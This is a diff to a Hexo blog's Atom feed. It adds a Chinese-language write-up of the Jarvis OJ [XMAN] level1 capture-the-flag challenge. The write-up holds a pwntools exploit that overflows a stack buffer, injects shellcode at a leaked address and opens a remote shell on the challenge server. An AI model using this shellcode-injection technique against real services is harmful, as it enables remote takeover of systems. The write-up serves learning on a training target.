@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2020-11-03T11:39:10.974Z</updated>
+  <updated>2020-11-10T09:45:57.188Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Jarvis OJ-[XMAN]level1</title>
+    <link href="http://example.com/2020/11/10/Jarvis-OJ-XMAN-level1/"/>
+    <id>http://example.com/2020/11/10/Jarvis-OJ-XMAN-level1/</id>
+    <published>2020-11-10T08:54:48.000Z</published>
+    <updated>2020-11-10T09:45:57.188Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><p>checksec 该文件发现</p><p>Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x8048000)<br>    RWX:      Has RWX segments</p><p>32位小端序</p><p>没开任何保护措施 但是 alsr默认打开</p><p>文件拖入32位ida</p><p>发现他自己打印出返回地址，稍加利用</p><p>from pwn import *<br>io = remote(‘pwn2.jarvisoj.com’, 9877)<br>text=io.recvline()[14:-2]    //取第14位到第倒数第二位<br>buf_addr=int(text,16)   //转为16进制<br>shellcode=asm(shellcraft.sh())   //由于没有bin/sh 使用pwntools自行建造<br>payload=shellcode+’a’*(0x8c-len(shellcode))+p32(buf_addr)    //该顺序问题尚未解决，希望大佬能教导我。本人qq1803022905</p><p>io.send(payload)<br>io.interactive()</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;一&quot;&gt;&lt;a href=&quot;#一&quot; class=&quot;headerlink&quot; title=&quot;一&quot;&gt;&lt;/a&gt;一&lt;/h3&gt;&lt;p&gt;checksec 该文件发现&lt;/p&gt;
+&lt;p&gt;Arch:     i386-32-little&lt;br&gt;    RELRO:    Partial RE</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>Ubuntu新手指令</title>
